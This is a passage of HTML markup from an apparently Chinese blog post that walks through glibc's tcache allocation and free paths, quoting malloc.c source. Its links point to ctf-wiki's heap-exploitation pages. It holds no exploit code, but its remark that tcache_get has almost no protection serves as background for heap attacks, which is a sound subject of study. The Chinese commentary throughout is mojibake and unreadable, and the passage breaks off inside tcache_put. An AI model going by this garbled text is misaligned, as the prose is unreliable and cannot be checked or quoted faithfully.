data-url=\"aHR0cHM6Ly9jb2RlLndvYm9xLm9yZy91c2Vyc3BhY2UvZ2xpYmMvbWFsbG9jL21hbGxvYy5jLmh0bWwjMzAxMA==\">source code</span></p>\n<figure class=\"highlight c\"><figcaption data-lang=\"c\"></figcaption><table><tr><td data-num=\"1\"></td><td><pre><span class=\"token keyword\">void</span> <span class=\"token operator\">*</span></pre></td></tr><tr><td data-num=\"2\"></td><td><pre><span class=\"token function\">__libc_malloc</span> <span class=\"token punctuation\">(</span><span class=\"token class-name\">size_t</span> bytes<span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"3\"></td><td><pre><span class=\"token punctuation\">&#123;</span></pre></td></tr><tr><td data-num=\"4\"></td><td><pre>    <span class=\"token punctuation\">.</span><span class=\"token punctuation\">.</span><span class=\"token punctuation\">.</span><span class=\"token punctuation\">.</span><span class=\"token punctuation\">.</span><span class=\"token punctuation\">.</span></pre></td></tr><tr><td data-num=\"5\"></td><td><pre>    <span class=\"token punctuation\">.</span><span class=\"token punctuation\">.</span><span class=\"token punctuation\">.</span><span class=\"token punctuation\">.</span><span class=\"token punctuation\">.</span><span class=\"token punctuation\">.</span></pre></td></tr><tr><td data-num=\"6\"></td><td><pre><span class=\"token macro property\"><span class=\"token directive-hash\">#</span><span class=\"token directive keyword\">if</span> <span class=\"token expression\">USE_TCACHE</span></span></pre></td></tr><tr><td data-num=\"7\"></td><td><pre>  <span class=\"token comment\">/* int_free also calls request2size, be careful to not pad twice.  */</span></pre></td></tr><tr><td data-num=\"8\"></td><td><pre>  <span class=\"token class-name\">size_t</span> tbytes<span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"9\"></td><td><pre>  <span class=\"token comment\">// æ ¹æ® malloc ä¼ å…¥çš„å‚æ•°è®¡ç®— chunk å®é™…å¤§å°ï¼Œå¹¶è®¡ç®— tcache å¯¹åº”çš„ä¸‹æ ‡</span></pre></td></tr><tr><td data-num=\"10\"></td><td><pre>  <span class=\"token function\">checked_request2size</span> <span class=\"token punctuation\">(</span>bytes<span class=\"token punctuation\">,</span> tbytes<span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"11\"></td><td><pre>  <span class=\"token class-name\">size_t</span> tc_idx <span class=\"token operator\">=</span> <span class=\"token function\">csize2tidx</span> <span class=\"token punctuation\">(</span>tbytes<span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"12\"></td><td><pre></pre></td></tr><tr><td data-num=\"13\"></td><td><pre>  <span class=\"token comment\">// åˆå§‹åŒ– tcache</span></pre></td></tr><tr><td data-num=\"14\"></td><td><pre>  <span class=\"token function\">MAYBE_INIT_TCACHE</span> <span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"15\"></td><td><pre>  DIAG_PUSH_NEEDS_COMMENT<span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"16\"></td><td><pre>  <span class=\"token keyword\">if</span> <span class=\"token punctuation\">(</span>tc_idx <span class=\"token operator\">&lt;</span> mp_<span class=\"token punctuation\">.</span>tcache_bins  <span class=\"token comment\">// æ ¹æ® size å¾—åˆ°çš„ idx åœ¨åˆæ³•çš„èŒƒå›´å†…</span></pre></td></tr><tr><td data-num=\"17\"></td><td><pre>      <span class=\"token comment\">/*&amp;&amp; tc_idx &lt; TCACHE_MAX_BINS*/</span> <span class=\"token comment\">/* to appease gcc */</span></pre></td></tr><tr><td data-num=\"18\"></td><td><pre>      <span class=\"token operator\">&amp;&amp;</span> tcache</pre></td></tr><tr><td data-num=\"19\"></td><td><pre>      <span class=\"token operator\">&amp;&amp;</span> tcache<span class=\"token operator\">-></span>entries<span class=\"token punctuation\">[</span>tc_idx<span class=\"token punctuation\">]</span> <span class=\"token operator\">!=</span> <span class=\"token constant\">NULL</span><span class=\"token punctuation\">)</span> <span class=\"token comment\">//tcache->entries [tc_idx] æœ‰ chunk</span></pre></td></tr><tr><td data-num=\"20\"></td><td><pre>    <span class=\"token punctuation\">&#123;</span></pre></td></tr><tr><td data-num=\"21\"></td><td><pre>      <span class=\"token keyword\">return</span> <span class=\"token function\">tcache_get</span> <span class=\"token punctuation\">(</span>tc_idx<span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"22\"></td><td><pre>    <span class=\"token punctuation\">&#125;</span></pre></td></tr><tr><td data-num=\"23\"></td><td><pre>  DIAG_POP_NEEDS_COMMENT<span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"24\"></td><td><pre><span class=\"token macro property\"><span class=\"token directive-hash\">#</span><span class=\"token directive keyword\">endif</span></span></pre></td></tr><tr><td data-num=\"25\"></td><td><pre>    <span class=\"token punctuation\">.</span><span class=\"token punctuation\">.</span><span class=\"token punctuation\">.</span><span class=\"token punctuation\">.</span><span class=\"token punctuation\">.</span><span class=\"token punctuation\">.</span></pre></td></tr><tr><td data-num=\"26\"></td><td><pre>    <span class=\"token punctuation\">.</span><span class=\"token punctuation\">.</span><span class=\"token punctuation\">.</span><span class=\"token punctuation\">.</span><span class=\"token punctuation\">.</span><span class=\"token punctuation\">.</span></pre></td></tr><tr><td data-num=\"27\"></td><td><pre><span class=\"token punctuation\">&#125;</span></pre></td></tr></table></figure><p>tcache_init()<span class=\"exturl\" data-url=\"aHR0cHM6Ly9jdGYtd2lraS5vcmcvcHduL2xpbnV4L3VzZXItbW9kZS9oZWFwL3B0bWFsbG9jMi9pbXBsZW1lbnRhdGlvbi90Y2FjaGUvI19fdGNhY2hlX2luaXQ=\">Â¶</span></p>\n<p>å…¶ä¸­  <code>MAYBE_INIT_TCACHE ()</code>  åœ¨ tcache ä¸ºç©ºï¼ˆå³ç¬¬ä¸€æ¬¡ mallocï¼‰æ—¶è°ƒç”¨äº†  <code>tcache_init()</code> ï¼Œç›´æ¥æŸ¥çœ‹  <code>tcache_init()</code></p>\n<p><span class=\"exturl\" data-url=\"aHR0cHM6Ly9jb2RlLndvYm9xLm9yZy91c2Vyc3BhY2UvZ2xpYmMvbWFsbG9jL21hbGxvYy5jLmh0bWwjdGNhY2hlX2luaXQ=\">source code</span></p>\n<figure class=\"highlight c\"><figcaption data-lang=\"c\"></figcaption><table><tr><td data-num=\"1\"></td><td><pre><span class=\"token function\">tcache_init</span><span class=\"token punctuation\">(</span><span class=\"token keyword\">void</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"2\"></td><td><pre><span class=\"token punctuation\">&#123;</span></pre></td></tr><tr><td data-num=\"3\"></td><td><pre>  mstate ar_ptr<span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"4\"></td><td><pre>  <span class=\"token keyword\">void</span> <span class=\"token operator\">*</span>victim <span class=\"token operator\">=</span> <span class=\"token number\">0</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"5\"></td><td><pre>  <span class=\"token keyword\">const</span> <span class=\"token class-name\">size_t</span> bytes <span class=\"token operator\">=</span> <span class=\"token keyword\">sizeof</span> <span class=\"token punctuation\">(</span>tcache_perthread_struct<span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"6\"></td><td><pre>  <span class=\"token keyword\">if</span> <span class=\"token punctuation\">(</span>tcache_shutting_down<span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"7\"></td><td><pre>    <span class=\"token keyword\">return</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"8\"></td><td><pre>  <span class=\"token function\">arena_get</span> <span class=\"token punctuation\">(</span>ar_ptr<span class=\"token punctuation\">,</span> bytes<span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span> <span class=\"token comment\">// æ‰¾åˆ°å¯ç”¨çš„ arena</span></pre></td></tr><tr><td data-num=\"9\"></td><td><pre>  victim <span class=\"token operator\">=</span> <span class=\"token function\">_int_malloc</span> <span class=\"token punctuation\">(</span>ar_ptr<span class=\"token punctuation\">,</span> bytes<span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span> <span class=\"token comment\">// ç”³è¯·ä¸€ä¸ª sizeof (tcache_perthread_struct) å¤§å°çš„ chunk</span></pre></td></tr><tr><td data-num=\"10\"></td><td><pre>  <span class=\"token keyword\">if</span> <span class=\"token punctuation\">(</span><span class=\"token operator\">!</span>victim <span class=\"token operator\">&amp;&amp;</span> ar_ptr <span class=\"token operator\">!=</span> <span class=\"token constant\">NULL</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"11\"></td><td><pre>    <span class=\"token punctuation\">&#123;</span></pre></td></tr><tr><td data-num=\"12\"></td><td><pre>      ar_ptr <span class=\"token operator\">=</span> <span class=\"token function\">arena_get_retry</span> <span class=\"token punctuation\">(</span>ar_ptr<span class=\"token punctuation\">,</span> bytes<span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"13\"></td><td><pre>      victim <span class=\"token operator\">=</span> <span class=\"token function\">_int_malloc</span> <span class=\"token punctuation\">(</span>ar_ptr<span class=\"token punctuation\">,</span> bytes<span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"14\"></td><td><pre>    <span class=\"token punctuation\">&#125;</span></pre></td></tr><tr><td data-num=\"15\"></td><td><pre>  <span class=\"token keyword\">if</span> <span class=\"token punctuation\">(</span>ar_ptr <span class=\"token operator\">!=</span> <span class=\"token constant\">NULL</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"16\"></td><td><pre>    <span class=\"token function\">__libc_lock_unlock</span> <span class=\"token punctuation\">(</span>ar_ptr<span class=\"token operator\">-></span>mutex<span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"17\"></td><td><pre>  <span class=\"token comment\">/* In a low memory situation, we may not be able to allocate memory</pre></td></tr><tr><td data-num=\"18\"></td><td><pre>     - in which case, we just keep trying later.  However, we</pre></td></tr><tr><td data-num=\"19\"></td><td><pre>     typically do this very early, so either there is sufficient</pre></td></tr><tr><td data-num=\"20\"></td><td><pre>     memory, or there isn't enough memory to do non-trivial</pre></td></tr><tr><td data-num=\"21\"></td><td><pre>     allocations anyway.  */</span></pre></td></tr><tr><td data-num=\"22\"></td><td><pre>  <span class=\"token keyword\">if</span> <span class=\"token punctuation\">(</span>victim<span class=\"token punctuation\">)</span> <span class=\"token comment\">// åˆå§‹åŒ– tcache</span></pre></td></tr><tr><td data-num=\"23\"></td><td><pre>    <span class=\"token punctuation\">&#123;</span></pre></td></tr><tr><td data-num=\"24\"></td><td><pre>      tcache <span class=\"token operator\">=</span> <span class=\"token punctuation\">(</span>tcache_perthread_struct <span class=\"token operator\">*</span><span class=\"token punctuation\">)</span> victim<span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"25\"></td><td><pre>      <span class=\"token function\">memset</span> <span class=\"token punctuation\">(</span>tcache<span class=\"token punctuation\">,</span> <span class=\"token number\">0</span><span class=\"token punctuation\">,</span> <span class=\"token keyword\">sizeof</span> <span class=\"token punctuation\">(</span>tcache_perthread_struct<span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"26\"></td><td><pre>    <span class=\"token punctuation\">&#125;</span></pre></td></tr><tr><td data-num=\"27\"></td><td><pre><span class=\"token punctuation\">&#125;</span></pre></td></tr></table></figure><p><code>tcache_init()</code>  æˆåŠŸè¿”å›åï¼Œ <code>tcache_perthread_struct</code>  å°±è¢«æˆåŠŸå»ºç«‹äº†ã€‚</p>\n<p>ç”³è¯·å†…å­˜ <span class=\"exturl\" data-url=\"aHR0cHM6Ly9jdGYtd2lraS5vcmcvcHduL2xpbnV4L3VzZXItbW9kZS9oZWFwL3B0bWFsbG9jMi9pbXBsZW1lbnRhdGlvbi90Y2FjaGUvI180\">Â¶</span></p>\n<p>æ¥ä¸‹æ¥å°†è¿›å…¥ç”³è¯·å†…å­˜çš„æ­¥éª¤</p>\n<figure class=\"highlight c\"><figcaption data-lang=\"c\"></figcaption><table><tr><td data-num=\"1\"></td><td><pre><span class=\"token comment\">// ä» tcache list ä¸­è·å–å†…å­˜</span></pre></td></tr><tr><td data-num=\"2\"></td><td><pre>  <span class=\"token keyword\">if</span> <span class=\"token punctuation\">(</span>tc_idx <span class=\"token operator\">&lt;</span> mp_<span class=\"token punctuation\">.</span>tcache_bins <span class=\"token comment\">// ç”± size è®¡ç®—çš„ idx åœ¨åˆæ³•èŒƒå›´å†…</span></pre></td></tr><tr><td data-num=\"3\"></td><td><pre>      <span class=\"token comment\">/*&amp;&amp; tc_idx &lt; TCACHE_MAX_BINS*/</span> <span class=\"token comment\">/* to appease gcc */</span></pre></td></tr><tr><td data-num=\"4\"></td><td><pre>      <span class=\"token operator\">&amp;&amp;</span> tcache</pre></td></tr><tr><td data-num=\"5\"></td><td><pre>      <span class=\"token operator\">&amp;&amp;</span> tcache<span class=\"token operator\">-></span>entries<span class=\"token punctuation\">[</span>tc_idx<span class=\"token punctuation\">]</span> <span class=\"token operator\">!=</span> <span class=\"token constant\">NULL</span><span class=\"token punctuation\">)</span> <span class=\"token comment\">// è¯¥æ¡ tcache é“¾ä¸ä¸ºç©º</span></pre></td></tr><tr><td data-num=\"6\"></td><td><pre>    <span class=\"token punctuation\">&#123;</span></pre></td></tr><tr><td data-num=\"7\"></td><td><pre>      <span class=\"token keyword\">return</span> <span class=\"token function\">tcache_get</span> <span class=\"token punctuation\">(</span>tc_idx<span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"8\"></td><td><pre>    <span class=\"token punctuation\">&#125;</span></pre></td></tr><tr><td data-num=\"9\"></td><td><pre>  DIAG_POP_NEEDS_COMMENT<span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"10\"></td><td><pre><span class=\"token macro property\"><span class=\"token directive-hash\">#</span><span class=\"token directive keyword\">endif</span></span></pre></td></tr><tr><td data-num=\"11\"></td><td><pre>  <span class=\"token comment\">// è¿›å…¥ä¸æ—  tcache æ—¶ç±»ä¼¼çš„æµç¨‹</span></pre></td></tr><tr><td data-num=\"12\"></td><td><pre>  <span class=\"token keyword\">if</span> <span class=\"token punctuation\">(</span>SINGLE_THREAD_P<span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"13\"></td><td><pre>    <span class=\"token punctuation\">&#123;</span></pre></td></tr><tr><td data-num=\"14\"></td><td><pre>      victim <span class=\"token operator\">=</span> <span class=\"token function\">_int_malloc</span> <span class=\"token punctuation\">(</span><span class=\"token operator\">&amp;</span>main_arena<span class=\"token punctuation\">,</span> bytes<span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"15\"></td><td><pre>      <span class=\"token function\">assert</span> <span class=\"token punctuation\">(</span><span class=\"token operator\">!</span>victim <span class=\"token operator\">||</span> <span class=\"token function\">chunk_is_mmapped</span> <span class=\"token punctuation\">(</span><span class=\"token function\">mem2chunk</span> <span class=\"token punctuation\">(</span>victim<span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span> <span class=\"token operator\">||</span></pre></td></tr><tr><td data-num=\"16\"></td><td><pre>              <span class=\"token operator\">&amp;</span>main_arena <span class=\"token operator\">==</span> <span class=\"token function\">arena_for_chunk</span> <span class=\"token punctuation\">(</span><span class=\"token function\">mem2chunk</span> <span class=\"token punctuation\">(</span>victim<span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"17\"></td><td><pre>      <span class=\"token keyword\">return</span> victim<span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"18\"></td><td><pre>    <span class=\"token punctuation\">&#125;</span></pre></td></tr></table></figure><p>åœ¨  <code>tcache-&gt;entries</code>  ä¸ä¸ºç©ºæ—¶ï¼Œå°†è¿›å…¥  <code>tcache_get()</code>  çš„æµç¨‹è·å– chunkï¼Œå¦åˆ™ä¸ tcache æœºåˆ¶å‰çš„æµç¨‹ç±»ä¼¼ï¼Œè¿™é‡Œä¸»è¦åˆ†æç¬¬ä¸€ç§  <code>tcache_get()</code> ã€‚è¿™é‡Œä¹Ÿå¯ä»¥çœ‹å‡º tcache çš„ä¼˜å…ˆçº§å¾ˆé«˜ï¼Œæ¯” fastbin è¿˜è¦é«˜ï¼ˆ fastbin çš„ç”³è¯·åœ¨æ²¡è¿›å…¥ tcache çš„æµç¨‹ä¸­ï¼‰ã€‚</p>\n<p>tcache_get()<span class=\"exturl\" data-url=\"aHR0cHM6Ly9jdGYtd2lraS5vcmcvcHduL2xpbnV4L3VzZXItbW9kZS9oZWFwL3B0bWFsbG9jMi9pbXBsZW1lbnRhdGlvbi90Y2FjaGUvI3RjYWNoZV9nZXQ=\">Â¶</span></p>\n<p>çœ‹ä¸€ä¸‹  <code>tcache_get()</code></p>\n<p><span class=\"exturl\" data-url=\"aHR0cHM6Ly9jb2RlLndvYm9xLm9yZy91c2Vyc3BhY2UvZ2xpYmMvbWFsbG9jL21hbGxvYy5jLmh0bWwjdGNhY2hlX2dldA==\">source code</span></p>\n<figure class=\"highlight c\"><figcaption data-lang=\"c\"></figcaption><table><tr><td data-num=\"1\"></td><td><pre><span class=\"token comment\">/* Caller must ensure that we know tc_idx is valid and there's</pre></td></tr><tr><td data-num=\"2\"></td><td><pre>   available chunks to remove.  */</span></pre></td></tr><tr><td data-num=\"3\"></td><td><pre><span class=\"token keyword\">static</span> __always_inline <span class=\"token keyword\">void</span> <span class=\"token operator\">*</span></pre></td></tr><tr><td data-num=\"4\"></td><td><pre><span class=\"token function\">tcache_get</span> <span class=\"token punctuation\">(</span><span class=\"token class-name\">size_t</span> tc_idx<span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"5\"></td><td><pre><span class=\"token punctuation\">&#123;</span></pre></td></tr><tr><td data-num=\"6\"></td><td><pre>  tcache_entry <span class=\"token operator\">*</span>e <span class=\"token operator\">=</span> tcache<span class=\"token operator\">-></span>entries<span class=\"token punctuation\">[</span>tc_idx<span class=\"token punctuation\">]</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"7\"></td><td><pre>  <span class=\"token function\">assert</span> <span class=\"token punctuation\">(</span>tc_idx <span class=\"token operator\">&lt;</span> TCACHE_MAX_BINS<span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"8\"></td><td><pre>  <span class=\"token function\">assert</span> <span class=\"token punctuation\">(</span>tcache<span class=\"token operator\">-></span>entries<span class=\"token punctuation\">[</span>tc_idx<span class=\"token punctuation\">]</span> <span class=\"token operator\">></span> <span class=\"token number\">0</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"9\"></td><td><pre>  tcache<span class=\"token operator\">-></span>entries<span class=\"token punctuation\">[</span>tc_idx<span class=\"token punctuation\">]</span> <span class=\"token operator\">=</span> e<span class=\"token operator\">-></span>next<span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"10\"></td><td><pre>  <span class=\"token operator\">--</span><span class=\"token punctuation\">(</span>tcache<span class=\"token operator\">-></span>counts<span class=\"token punctuation\">[</span>tc_idx<span class=\"token punctuation\">]</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span> <span class=\"token comment\">// è·å¾—ä¸€ä¸ª chunkï¼Œcounts å‡ä¸€</span></pre></td></tr><tr><td data-num=\"11\"></td><td><pre>  <span class=\"token keyword\">return</span> <span class=\"token punctuation\">(</span><span class=\"token keyword\">void</span> <span class=\"token operator\">*</span><span class=\"token punctuation\">)</span> e<span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"12\"></td><td><pre><span class=\"token punctuation\">&#125;</span></pre></td></tr></table></figure><p><code>tcache_get()</code>  å°±æ˜¯è·å¾— chunk çš„è¿‡ç¨‹äº†ã€‚å¯ä»¥çœ‹å‡ºè¿™ä¸ªè¿‡ç¨‹è¿˜æ˜¯å¾ˆç®€å•çš„ï¼Œä»  <code>tcache-&gt;entries[tc_idx]</code>  ä¸­è·å¾—ç¬¬ä¸€ä¸ª chunkï¼Œ <code>tcache-&gt;counts</code>  å‡ä¸€ï¼Œå‡ ä¹æ²¡æœ‰ä»»ä½•ä¿æŠ¤ã€‚</p>\n<p>libc_free()<span class=\"exturl\" data-url=\"aHR0cHM6Ly9jdGYtd2lraS5vcmcvcHduL2xpbnV4L3VzZXItbW9kZS9oZWFwL3B0bWFsbG9jMi9pbXBsZW1lbnRhdGlvbi90Y2FjaGUvI19fbGliY19mcmVl\">Â¶</span></p>\n<p>çœ‹å®Œç”³è¯·ï¼Œå†çœ‹çœ‹æœ‰ tcache æ—¶çš„é‡Šæ”¾</p>\n<p><span class=\"exturl\" data-url=\"aHR0cHM6Ly9jb2RlLndvYm9xLm9yZy91c2Vyc3BhY2UvZ2xpYmMvbWFsbG9jL21hbGxvYy5jLmh0bWwjMzA2OA==\">source code</span></p>\n<figure class=\"highlight c\"><figcaption data-lang=\"c\"></figcaption><table><tr><td data-num=\"1\"></td><td><pre><span class=\"token keyword\">void</span></pre></td></tr><tr><td data-num=\"2\"></td><td><pre><span class=\"token function\">__libc_free</span> <span class=\"token punctuation\">(</span><span class=\"token keyword\">void</span> <span class=\"token operator\">*</span>mem<span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"3\"></td><td><pre><span class=\"token punctuation\">&#123;</span></pre></td></tr><tr><td data-num=\"4\"></td><td><pre>  <span class=\"token punctuation\">.</span><span class=\"token punctuation\">.</span><span class=\"token punctuation\">.</span><span class=\"token punctuation\">.</span><span class=\"token punctuation\">.</span><span class=\"token punctuation\">.</span></pre></td></tr><tr><td data-num=\"5\"></td><td><pre>  <span class=\"token punctuation\">.</span><span class=\"token punctuation\">.</span><span class=\"token punctuation\">.</span><span class=\"token punctuation\">.</span><span class=\"token punctuation\">.</span><span class=\"token punctuation\">.</span></pre></td></tr><tr><td data-num=\"6\"></td><td><pre>  <span class=\"token function\">MAYBE_INIT_TCACHE</span> <span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"7\"></td><td><pre>  ar_ptr <span class=\"token operator\">=</span> <span class=\"token function\">arena_for_chunk</span> <span class=\"token punctuation\">(</span>p<span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"8\"></td><td><pre>  <span class=\"token function\">_int_free</span> <span class=\"token punctuation\">(</span>ar_ptr<span class=\"token punctuation\">,</span> p<span class=\"token punctuation\">,</span> <span class=\"token number\">0</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"9\"></td><td><pre><span class=\"token punctuation\">&#125;</span></pre></td></tr></table></figure><p><code>__libc_free()</code>  æ²¡æœ‰å¤ªå¤šå˜åŒ–ï¼Œ <code>MAYBE_INIT_TCACHE ()</code>  åœ¨ tcache ä¸ä¸ºç©ºå¤±å»äº†ä½œç”¨ã€‚</p>\n<p>int_free()<span class=\"exturl\" data-url=\"aHR0cHM6Ly9jdGYtd2lraS5vcmcvcHduL2xpbnV4L3VzZXItbW9kZS9oZWFwL3B0bWFsbG9jMi9pbXBsZW1lbnRhdGlvbi90Y2FjaGUvI19pbnRfZnJlZQ==\">Â¶</span></p>\n<p>è·Ÿè¿›  <code>_int_free()</code></p>\n<p><span class=\"exturl\" data-url=\"aHR0cHM6Ly9jb2RlLndvYm9xLm9yZy91c2Vyc3BhY2UvZ2xpYmMvbWFsbG9jL21hbGxvYy5jLmh0bWwjNDEyMw==\">source code</span></p>\n<figure class=\"highlight c\"><figcaption data-lang=\"c\"></figcaption><table><tr><td data-num=\"1\"></td><td><pre><span class=\"token keyword\">static</span> <span class=\"token keyword\">void</span></pre></td></tr><tr><td data-num=\"2\"></td><td><pre><span class=\"token function\">_int_free</span> <span class=\"token punctuation\">(</span>mstate av<span class=\"token punctuation\">,</span> mchunkptr p<span class=\"token punctuation\">,</span> <span class=\"token keyword\">int</span> have_lock<span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"3\"></td><td><pre><span class=\"token punctuation\">&#123;</span></pre></td></tr><tr><td data-num=\"4\"></td><td><pre>  <span class=\"token punctuation\">.</span><span class=\"token punctuation\">.</span><span class=\"token punctuation\">.</span><span class=\"token punctuation\">.</span><span class=\"token punctuation\">.</span><span class=\"token punctuation\">.</span></pre></td></tr><tr><td data-num=\"5\"></td><td><pre>  <span class=\"token punctuation\">.</span><span class=\"token punctuation\">.</span><span class=\"token punctuation\">.</span><span class=\"token punctuation\">.</span><span class=\"token punctuation\">.</span><span class=\"token punctuation\">.</span></pre></td></tr><tr><td data-num=\"6\"></td><td><pre><span class=\"token macro property\"><span class=\"token directive-hash\">#</span><span class=\"token directive keyword\">if</span> <span class=\"token expression\">USE_TCACHE</span></span></pre></td></tr><tr><td data-num=\"7\"></td><td><pre>  <span class=\"token punctuation\">&#123;</span></pre></td></tr><tr><td data-num=\"8\"></td><td><pre>    <span class=\"token class-name\">size_t</span> tc_idx <span class=\"token operator\">=</span> <span class=\"token function\">csize2tidx</span> <span class=\"token punctuation\">(</span>size<span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"9\"></td><td><pre>    <span class=\"token keyword\">if</span> <span class=\"token punctuation\">(</span>tcache</pre></td></tr><tr><td data-num=\"10\"></td><td><pre>        <span class=\"token operator\">&amp;&amp;</span> tc_idx <span class=\"token operator\">&lt;</span> mp_<span class=\"token punctuation\">.</span>tcache_bins <span class=\"token comment\">// 64</span></pre></td></tr><tr><td data-num=\"11\"></td><td><pre>        <span class=\"token operator\">&amp;&amp;</span> tcache<span class=\"token operator\">-></span>counts<span class=\"token punctuation\">[</span>tc_idx<span class=\"token punctuation\">]</span> <span class=\"token operator\">&lt;</span> mp_<span class=\"token punctuation\">.</span>tcache_count<span class=\"token punctuation\">)</span> <span class=\"token comment\">// 7</span></pre></td></tr><tr><td data-num=\"12\"></td><td><pre>      <span class=\"token punctuation\">&#123;</span></pre></td></tr><tr><td data-num=\"13\"></td><td><pre>        <span class=\"token function\">tcache_put</span> <span class=\"token punctuation\">(</span>p<span class=\"token punctuation\">,</span> tc_idx<span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"14\"></td><td><pre>        <span class=\"token keyword\">return</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"15\"></td><td><pre>      <span class=\"token punctuation\">&#125;</span></pre></td></tr><tr><td data-num=\"16\"></td><td><pre>  <span class=\"token punctuation\">&#125;</span></pre></td></tr><tr><td data-num=\"17\"></td><td><pre><span class=\"token macro property\"><span class=\"token directive-hash\">#</span><span class=\"token directive keyword\">endif</span></span></pre></td></tr><tr><td data-num=\"18\"></td><td><pre>  <span class=\"token punctuation\">.</span><span class=\"token punctuation\">.</span><span class=\"token punctuation\">.</span><span class=\"token punctuation\">.</span><span class=\"token punctuation\">.</span><span class=\"token punctuation\">.</span></pre></td></tr><tr><td data-num=\"19\"></td><td><pre>  <span class=\"token punctuation\">.</span><span class=\"token punctuation\">.</span><span class=\"token punctuation\">.</span><span class=\"token punctuation\">.</span><span class=\"token punctuation\">.</span><span class=\"token punctuation\">.</span></pre></td></tr></table></figure><p>åˆ¤æ–­  <code>tc_idx</code>  åˆæ³•ï¼Œ <code>tcache-&gt;counts[tc_idx]</code>  åœ¨ 7 ä¸ªä»¥å†…æ—¶ï¼Œå°±è¿›å…¥  <code>tcache_put()</code> ï¼Œä¼ é€’çš„ä¸¤ä¸ªå‚æ•°æ˜¯è¦é‡Šæ”¾çš„ chunk å’Œè¯¥ chunk å¯¹åº”çš„ size åœ¨ tcache ä¸­çš„ä¸‹æ ‡ã€‚</p>\n<p>tcache_put()<span class=\"exturl\" data-url=\"aHR0cHM6Ly9jdGYtd2lraS5vcmcvcHduL2xpbnV4L3VzZXItbW9kZS9oZWFwL3B0bWFsbG9jMi9pbXBsZW1lbnRhdGlvbi90Y2FjaGUvI3RjYWNoZV9wdXQ=\">Â¶</span></p>\n<p><span class=\"exturl\" data-url=\"aHR0cHM6Ly9jb2RlLndvYm9xLm9yZy91c2Vyc3BhY2UvZ2xpYmMvbWFsbG9jL21hbGxvYy5jLmh0bWwjMjkwNw==\">source code</span></p>\n<figure class=\"highlight c\"><figcaption data-lang=\"c\"></figcaption><table><tr><td data-num=\"1\"></td><td><pre><span class=\"token comment\">/* Caller must ensure that we know tc_idx is valid and there's room</pre></td></tr><tr><td data-num=\"2\"></td><td><pre>   for more chunks.  */</span></pre></td></tr><tr><td data-num=\"3\"></td><td><pre><span class=\"token keyword\">static</span> __always_inline <span class=\"token keyword\">void</span></pre></td></tr><tr><td data-num=\"4\"></td><td><pre><span class=\"token function\">tcache_put</span> <span class=\"token punctuation\">(</span>mchunkptr chunk<span class=\"token punctuation\">,</span> <span class=\"token class-name\">size_t</span> tc_idx<span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"5\"></td><td><pre><span class=\"token punctuation\">&#123;</span></pre></td></tr><tr><td data-num=\"6\"></td><td><pre>  tcache_entry <span class=\"token operator\">*</span>e <span class=\"token operator\">=</span> <span class=\"token punctuation\">(</span>tcache_entry <span class=\"token operator\">*</span><span class=\"token punctuation\">)</span> <span class=\"token function\">chunk2mem</span> <span class=\"token punctuation\">(</span>chunk<span class=\"token punctuation\">)</span><span class=\"token 